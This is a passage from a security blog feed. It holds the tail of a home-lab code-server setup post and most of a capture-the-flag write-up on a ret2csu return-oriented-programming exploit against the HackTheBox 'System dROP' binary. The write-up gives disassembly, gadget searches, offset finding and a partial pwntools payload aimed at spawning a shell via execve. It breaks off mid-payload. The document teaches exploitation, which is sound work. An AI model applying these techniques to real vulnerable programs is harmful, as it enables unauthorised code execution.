+        - <span style="color:#e6db74">&#34;traefik.http.services.code-svc.loadbalancer.server.port=8443&#34;</span>
+
+
+<span style="color:#f92672">volumes</span>:
+  <span style="color:#f92672">appdata</span>:
+    <span style="color:#f92672">driver_opts</span>:
+      <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;cifs&#34;</span>
+      <span style="color:#f92672">o</span>: <span style="color:#e6db74">&#34;username=docker,password=swarm,vers=3.0,uid=1000,gid=1000,rw&#34;</span>
+      <span style="color:#f92672">device</span>: <span style="color:#e6db74">&#34;//YOUR_NAS_IP/configs/swarm/code&#34;</span>
+</code></pre></div><p>Notes:</p>
+<ul>
+<li>We also scope this to the swarm manager because code-server doesn&rsquo;t run on armhfV6 (which is
+what my Pi Zeros are). Given compatible architectures, you can remove this constraint and have
+many replicas of code-server in order to achieve redundancy.</li>
+</ul>
+<p>Upon first visit to <code>code.chappa.ai</code>, you&rsquo;ll be granted TLS certs for that domain in the background
+before finally loading:</p>
+<p><img src="4.png" alt=""></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Feel free to stuff your cluster back in your drawer and GO OUTSIDE!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Ret2CSU</title>
+            <link>https://sec.alexflor.es/posts/2021/04/ret2csu/</link>
+            <pubDate>Sat, 24 Apr 2021 11:42:16 -0400</pubDate>
+            
+            <guid>https://sec.alexflor.es/posts/2021/04/ret2csu/</guid>
+            <description>What is __libc_csu_init anyway? Hackthebox hosted the CTF event, CyberPocalypse2021 this last week. Great event. Let&amp;rsquo;s talk about the System dROP challenge.
+A while ago, I&amp;rsquo;d read a BlackHat paper on something called &amp;lsquo;ret2csu&amp;rsquo;. The TL;DR is that glibc attaches code that bootstraps your C. Within the attached code, there exists two segments of assembly, that when used together, can be very useful in constructing ROP chains without needing bother with any ASLR&amp;rsquo;d library, provided there exists some other useful code within the main ELF.</description>
+            <content type="html"><![CDATA[<h1 id="what-is-__libc_csu_init-anyway">What is <code>__libc_csu_init</code> anyway?</h1>
+<p>Hackthebox hosted the CTF event, CyberPocalypse2021 this last week. Great event.
+Let&rsquo;s talk about the <code>System dROP</code> challenge.</p>
+<p>A while ago, I&rsquo;d read a <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">BlackHat paper</a>
+on something called &lsquo;ret2csu&rsquo;.
+The TL;DR is that glibc attaches code that bootstraps your C. Within the attached code, there
+exists two segments of assembly, that when used together, can be very useful in constructing ROP
+chains without needing bother with any ASLR&rsquo;d library, provided there exists some other useful code
+within the main ELF. There&rsquo;s an additional hurdle if PIE is enabled, but it remains just that, a
+temporary road block.</p>
+<p>I hadn&rsquo;t yet run into the need to use it, until this challenge.</p>
+<h2 id="sytem-drop">Sytem dROP</h2>
+<p>Maybe I didn&rsquo;t <em>need</em> ret2csu. If you take the capital letters (or the flag text itself) from this
+challenge, signs point to the use of the SROP, (or SIGret) technique. I didn&rsquo;t go that route. I&rsquo;ve
+written about SIGROP before, <a href="https://sec.alexflor.es/posts/2019/12/abusing-signals-with-sigrop-exploits/">check it
+out</a> if you&rsquo;re
+interested.</p>
+<h2 id="the-gadgets">The Gadgets</h2>
+<p>Here&rsquo;s the injected function&rsquo;s disassembled code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0000000000400570</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">__libc_csu_init</span><span style="color:#f92672">&gt;</span>:
+  <span style="color:#960050;background-color:#1e0010">400570:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">57</span>                   <span style="color:#a6e22e">push</span>   r15
+  <span style="color:#960050;background-color:#1e0010">400572:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">56</span>                   <span style="color:#a6e22e">push</span>   r14
+  <span style="color:#960050;background-color:#1e0010">400574:</span>       <span style="color:#960050;background-color:#1e0010">49</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">d7</span>                mov    r15,rdx
+  <span style="color:#960050;background-color:#1e0010">400577:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">55</span>                   <span style="color:#a6e22e">push</span>   r13
+  <span style="color:#960050;background-color:#1e0010">400579:</span>       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">54</span>                   <span style="color:#a6e22e">push</span>   r12
+  <span style="color:#960050;background-color:#1e0010">40057</span>b:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">8</span>d <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">8</span>e <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>    lea    r12,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20088e</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">600</span>e10 <span style="color:#f92672">&lt;</span>__frame_dummy_init_array_entry<span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">400582:</span>       <span style="color:#960050;background-color:#1e0010">55</span>                      <span style="color:#a6e22e">push</span>   rbp
+  <span style="color:#960050;background-color:#1e0010">400583:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#a6e22e">d</span> <span style="color:#ae81ff">2</span>d <span style="color:#ae81ff">8</span>e <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>    lea    rbp,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20088e</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">600</span>e18 <span style="color:#f92672">&lt;</span>__do_global_dtors_aux_fini_array_entry<span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">40058</span>a:       <span style="color:#960050;background-color:#1e0010">53</span>                      <span style="color:#a6e22e">push</span>   rbx
+  <span style="color:#960050;background-color:#1e0010">40058</span>b:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">fd</span>                mov    r13d,edi
+  <span style="color:#960050;background-color:#1e0010">40058</span>e:       <span style="color:#960050;background-color:#1e0010">49</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">f6</span>                mov    r14,rsi
+  <span style="color:#960050;background-color:#1e0010">400591:</span>       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">29</span> e5                sub    rbp,r12
+  <span style="color:#960050;background-color:#1e0010">400594:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">ec</span> <span style="color:#ae81ff">08</span>             sub    rsp,<span style="color:#ae81ff">0x8</span>
+  <span style="color:#960050;background-color:#1e0010">400598:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#a6e22e">c1</span> fd <span style="color:#ae81ff">03</span>             sar    rbp,<span style="color:#ae81ff">0x3</span>
+  <span style="color:#960050;background-color:#1e0010">40059</span>c:       <span style="color:#a6e22e">e8</span> <span style="color:#ae81ff">5</span>f fe ff ff          call   <span style="color:#ae81ff">400400</span> <span style="color:#f92672">&lt;</span>_init<span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>a1:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">85</span> <span style="color:#a6e22e">ed</span>                test   rbp,rbp
+  <span style="color:#960050;background-color:#1e0010">4005</span>a4:       <span style="color:#960050;background-color:#1e0010">74</span> <span style="color:#960050;background-color:#1e0010">20</span>                   <span style="color:#a6e22e">je</span>     <span style="color:#ae81ff">4005</span>c6 <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">0x56</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>a6:       <span style="color:#960050;background-color:#1e0010">31</span> <span style="color:#66d9ef">db</span>                   xor    ebx,ebx
+  <span style="color:#960050;background-color:#1e0010">4005</span>a8:       <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">f</span> <span style="color:#ae81ff">1</span>f <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>    nop    <span style="color:#66d9ef">DWORD</span> PTR [rax<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>]
+  <span style="color:#960050;background-color:#1e0010">4005</span>af:       <span style="color:#960050;background-color:#1e0010">00</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>b0:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> fa                mov    rdx,r15
+  <span style="color:#960050;background-color:#1e0010">4005</span>b3:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> f6                mov    rsi,r14
+  <span style="color:#960050;background-color:#1e0010">4005</span>b6:       <span style="color:#960050;background-color:#1e0010">44</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">ef</span>                mov    edi,r13d
+  <span style="color:#960050;background-color:#1e0010">4005</span>b9:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">14</span> dc             call   <span style="color:#66d9ef">QWORD</span> PTR [r12<span style="color:#f92672">+</span>rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
+  <span style="color:#960050;background-color:#1e0010">4005</span>bd:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">c3</span> <span style="color:#ae81ff">01</span>             add    rbx,<span style="color:#ae81ff">0x1</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>c1:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">39</span> <span style="color:#66d9ef">dd</span>                cmp    rbp,rbx
+  <span style="color:#960050;background-color:#1e0010">4005</span>c4:       <span style="color:#960050;background-color:#1e0010">75</span> <span style="color:#a6e22e">ea</span>                   jne    <span style="color:#ae81ff">4005</span>b0 <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>c6:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">c4</span> <span style="color:#ae81ff">08</span>             add    rsp,<span style="color:#ae81ff">0x8</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>ca:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">b</span>                      pop    rbx
+  <span style="color:#960050;background-color:#1e0010">4005</span>cb:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                      pop    rbp
+  <span style="color:#960050;background-color:#1e0010">4005</span>cc:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">c</span>                   pop    r12
+  <span style="color:#960050;background-color:#1e0010">4005</span>ce:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                   pop    r13
+  <span style="color:#960050;background-color:#1e0010">4005</span>d0:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">e</span>                   pop    r14
+  <span style="color:#960050;background-color:#1e0010">4005</span>d2:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">f</span>                   pop    r15
+  <span style="color:#960050;background-color:#1e0010">4005</span>d4:       <span style="color:#a6e22e">c3</span>                      ret
+  <span style="color:#960050;background-color:#1e0010">4005</span>d5:       <span style="color:#960050;background-color:#1e0010">90</span>                      <span style="color:#a6e22e">nop</span>
+  <span style="color:#960050;background-color:#1e0010">4005</span>d6:       <span style="color:#960050;background-color:#1e0010">66</span> <span style="color:#960050;background-color:#1e0010">2</span><span style="color:#a6e22e">e</span> <span style="color:#ae81ff">0</span>f <span style="color:#ae81ff">1</span>f <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>    nop    <span style="color:#66d9ef">WORD</span> PTR cs:[rax<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>]
+</code></pre></div><p>The two relevant pieces are (we&rsquo;ll get to why in a bit):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">  <span style="color:#960050;background-color:#1e0010">4005</span>ca:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">b</span>                      pop    rbx
+  <span style="color:#960050;background-color:#1e0010">4005</span>cb:       <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                      pop    rbp
+  <span style="color:#960050;background-color:#1e0010">4005</span>cc:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">c</span>                   pop    r12
+  <span style="color:#960050;background-color:#1e0010">4005</span>ce:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">d</span>                   pop    r13
+  <span style="color:#960050;background-color:#1e0010">4005</span>d0:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">e</span>                   pop    r14
+  <span style="color:#960050;background-color:#1e0010">4005</span>d2:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">f</span>                   pop    r15
+  <span style="color:#960050;background-color:#1e0010">4005</span>d4:       <span style="color:#a6e22e">c3</span>                      ret
+
+
+  <span style="color:#960050;background-color:#1e0010">4005</span>b0:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> fa                mov    rdx,r15
+  <span style="color:#960050;background-color:#1e0010">4005</span>b3:       <span style="color:#960050;background-color:#1e0010">4</span><span style="color:#a6e22e">c</span> <span style="color:#ae81ff">89</span> f6                mov    rsi,r14
+  <span style="color:#960050;background-color:#1e0010">4005</span>b6:       <span style="color:#960050;background-color:#1e0010">44</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">ef</span>                mov    edi,r13d
+  <span style="color:#960050;background-color:#1e0010">4005</span>b9:       <span style="color:#960050;background-color:#1e0010">41</span> <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">14</span> dc             call   <span style="color:#66d9ef">QWORD</span> PTR [r12<span style="color:#f92672">+</span>rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
+</code></pre></div><h2 id="the-code">The Code</h2>
+<p><code>main:</code> calls 2 functions, then returns</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">400541:</span>       <span style="color:#960050;background-color:#1e0010">55</span>                      <span style="color:#a6e22e">push</span>   rbp
+<span style="color:#960050;background-color:#1e0010">400542:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">e5</span>                mov    rbp,rsp
+<span style="color:#960050;background-color:#1e0010">400545:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">83</span> <span style="color:#a6e22e">ec</span> <span style="color:#ae81ff">20</span>             sub    rsp,<span style="color:#ae81ff">0x20</span>
+<span style="color:#960050;background-color:#1e0010">400549:</span>       <span style="color:#a6e22e">bf</span> <span style="color:#ae81ff">0</span>f <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    edi,<span style="color:#ae81ff">0xf</span>
+<span style="color:#960050;background-color:#1e0010">40054</span>e:       <span style="color:#a6e22e">e8</span> dd fe ff ff          call   <span style="color:#ae81ff">400430</span> <span style="color:#f92672">&lt;</span>alarm@plt<span style="color:#f92672">&gt;</span>
+<span style="color:#960050;background-color:#1e0010">400553:</span>       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">8</span><span style="color:#a6e22e">d</span> <span style="color:#ae81ff">45</span> e0             lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
+<span style="color:#960050;background-color:#1e0010">400557:</span>       <span style="color:#a6e22e">ba</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    edx,<span style="color:#ae81ff">0x100</span>
+<span style="color:#960050;background-color:#1e0010">40055</span>c:       <span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">c6</span>                mov    rsi,rax
+<span style="color:#960050;background-color:#1e0010">40055</span>f:       <span style="color:#a6e22e">bf</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    edi,<span style="color:#ae81ff">0x0</span>
+<span style="color:#960050;background-color:#1e0010">400564:</span>       <span style="color:#a6e22e">e8</span> d7 fe ff ff          call   <span style="color:#ae81ff">400440</span> <span style="color:#f92672">&lt;</span>read@plt<span style="color:#f92672">&gt;</span>
+<span style="color:#960050;background-color:#1e0010">400569:</span>       <span style="color:#a6e22e">b8</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>          mov    eax,<span style="color:#ae81ff">0x1</span>
+<span style="color:#960050;background-color:#1e0010">40056</span>e:       <span style="color:#a6e22e">c9</span>                      leave
+<span style="color:#960050;background-color:#1e0010">40056</span>f:       <span style="color:#a6e22e">c3</span>                      ret
+</code></pre></div><p>The code is fairly simple. We&rsquo;ve also only 2 imports from <code>libc</code>, <code>alarm</code>, and <code>read</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0000000000400430</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">alarm@plt</span><span style="color:#f92672">&gt;</span>:
+  <span style="color:#960050;background-color:#1e0010">400430:</span>       <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">25</span> e2 <span style="color:#ae81ff">0b</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>       jmp    <span style="color:#66d9ef">QWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200be2</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">601018</span> <span style="color:#f92672">&lt;</span>alarm@GLIBC_2.2.5<span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">400436:</span>       <span style="color:#960050;background-color:#1e0010">68</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span>          <span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x0</span>
+  <span style="color:#960050;background-color:#1e0010">40043</span>b:       <span style="color:#a6e22e">e9</span> e0 ff ff ff          jmp    <span style="color:#ae81ff">400420</span> <span style="color:#f92672">&lt;</span>.plt<span style="color:#f92672">&gt;</span>
+
+<span style="color:#960050;background-color:#1e0010">0000000000400440</span> <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#a6e22e">read@plt</span><span style="color:#f92672">&gt;</span>:
+  <span style="color:#960050;background-color:#1e0010">400440:</span>       <span style="color:#a6e22e">ff</span> <span style="color:#ae81ff">25</span> da <span style="color:#ae81ff">0b</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>       jmp    <span style="color:#66d9ef">QWORD</span> PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200bda</span>]        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">601020</span> <span style="color:#f92672">&lt;</span>read@GLIBC_2.2.5<span style="color:#f92672">&gt;</span>
+  <span style="color:#960050;background-color:#1e0010">400446:</span>       <span style="color:#960050;background-color:#1e0010">68</span> <span style="color:#960050;background-color:#1e0010">01</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">00</span>          <span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x1</span>
+</code></pre></div><h2 id="the-plan">The Plan</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ ropper --search <span style="color:#e6db74">&#39;syscall&#39;</span> --file ./system_drop
+
+<span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> File: ./system_drop
+0x000000000040053b: syscall; ret;
+</code></pre></div><p>Further analysis will reveal the existence of a <code>syscall</code> instruction within the binary. We should
+be able to use this to our advantage to call <code>execve('/bin/sh', 0, 0)</code>.</p>
+<h3 id="overview">Overview</h3>
+<ol>
+<li>Find our buffer length</li>
+<li>Our initial payload will contain all of the <em>actions</em> of our exploit path. (Timey, wimey)</li>
+<li>We&rsquo;ll trigger an additional read half way through our payload.
+<ul>
+<li>This will provide the second half with the <em>data</em> it needs to finish the exploit</li>
+</ul>
+</li>
+</ol>
+<h3 id="deeper-dive">Deeper Dive</h3>
+<p>The first leg of our ret2csu attack will focus on populating some seemingly-arbitrary registers. It
+may seem useless to put <code>syscall</code> and &ldquo;/bin/sh&rdquo; into <code>r12</code> and <code>r13</code>, after all, that&rsquo;s not the
+correct calling convention for x64 asm. The second leg of our csu code will do the rest of the
+lifting for us though.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b0</span>      mov rdx, r15
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b3</span>      mov rsi, r14
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b6</span>      mov edi, r13d
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x4005b9</span>      call <span style="color:#66d9ef">qword</span> [r12 <span style="color:#f92672">+</span> rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
+</code></pre></div><p>You&rsquo;ll notice that the <code>call</code> instruction at <code>0x4005b9</code> is de-referencing <code>r12 + rbx*8</code>. If we
+provide <code>0</code> to <code>rbx</code>, and a pointer to an address holding the instruction we want called, we should
+be in business. We&rsquo;ll also have to set <code>rax</code> to <code>59</code>, the <code>syscall</code> number for <code>execve</code>. Luckily,
+the return value of <code>read</code> is the length of input (we control this!), and that value gets stored at
+<code>rax</code>.</p>
+<p>We have yet to discuss two final pieces of this puzzle. The locations of the string &ldquo;/bin/sh&rdquo; and a
+pointer to <code>syscall</code>&rsquo;s location'. In this instance, we can simply create that data using the <code>read</code>
+function.</p>
+<p>The <code>.bss</code> section of an ELF gets loaded into memory as a <code>rw-</code> segment. This will do nicely. We
+don&rsquo;t need execution on this data. Given a known-constant address that&rsquo;s writeable, we can use this
+address as arguments to functions we want to set up, even if the data there is yet to be written.</p>
+<p>We&rsquo;ll need a gadget to set <code>rsi</code>, our read destination aka <code>bss</code></p>
+<pre tabindex="0"><code>NAME
+       read - read from a file descriptor
+SYNOPSIS
+                      rdi      rsi         rsx
+       ssize_t read(int fd, void *buf, size_t count);
+</code></pre><p>Half way through our exploit, we&rsquo;ll read the values in to the locations where we told future
+instructions to look.</p>
+<p>Abstractly, this is difficult to explain. We&rsquo;re essentially planning out 2 moves in advance,
+whereby the first move requests additional data in order to correctly complete the second. Again,
+Timey, wimey</p>
+<h2 id="the-exploit">The Exploit</h2>
+<h3 id="finding-the-offset">Finding the offset</h3>
+<p>We&rsquo;ll keep this section short. It&rsquo;s 40.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; r &lt;&lt;<span style="color:#f92672">(</span>cyclic 80<span style="color:#f92672">)</span>
+Starting program: ./system_drop &lt;&lt;<span style="color:#f92672">(</span>cyclic 80<span style="color:#f92672">)</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040056f in main <span style="color:#f92672">()</span>
+
+pwndbg&gt; x/dx $rsp
+0x7fffffffe1c8: 0x6161616b
+pwndbg&gt; cyclic -l 0x6161616b
+<span style="color:#ae81ff">40</span>
+</code></pre></div><h3 id="getting-the-bss-addresses">Getting the <code>.bss</code> addresses</h3>
+<p>You can get this dynamically from <code>pwntools</code> or manually with <code>objdump</code> or any disassembler of your
+choice.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./system_drop&#34;</span>
+    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (<span style="color:#ae81ff">0x400000</span>)
+In [<span style="color:#ae81ff">3</span>]: hex( context<span style="color:#f92672">.</span>binary<span style="color:#f92672">.</span>bss() )
+Out[<span style="color:#ae81ff">3</span>]: <span style="color:#e6db74">&#39;0x601038&#39;</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -D ./system_drop | grep -A <span style="color:#ae81ff">3</span> bss
+
+Disassembly of section .bss:
+<span style="color:#ae81ff">0000000000601038</span> &lt;completed.7698&gt;:
+</code></pre></div><h3 id="kick-off-a-new-read-to-fill-bss">Kick off a new <code>read</code> to fill <code>.bss</code></h3>
+<p>When we take control of the program, we will have just completed a <code>read</code> where the arguments
+were <code>read(1, $dest, 0x100)</code>. The 1st and 3rd arguments work great for us, so we&rsquo;ll
+only need to find a <code>pop rsi</code> gadget in order to set the 2nd argument to before jumping to read
+again.</p>
+<pre tabindex="0"><code>
+``` bash
+pwndbg&gt; ropper --  --search 'pop rsi'
+
+[INFO] File: system_drop
+0x00000000004005d1: pop rsi; pop r15; ret;
+</code></pre><p>Great. We can also dynamically fetch this in pwntools. I try to be kind to my future self when
+writing these exploits and avoid using &ldquo;magic numbers&rdquo;. In a year when I look back, I won&rsquo;t
+remember where <code>0x4005d1</code> came from.</p>
+<p>In any case, we can start building our payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">limit <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
+pop_rsi_r15_ret <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;pop rsi; pop r15; ret&#39;</span>)))
+ptr_bin_sh <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>bss()
+ptr_syscall <span style="color:#f92672">=</span> ptr_bin_sh <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>limit
+payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15_ret)     <span style="color:#75715e"># prepare additional `read`</span>
+payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># rsi - read dest</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadc0de</span>)          <span style="color:#75715e"># r15 - junk</span>
+<span style="color:#75715e"># ret</span>
+payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read)          <span style="color:#75715e"># read in bin/sh to .bss</span>
+<span style="color:#75715e"># ret</span>
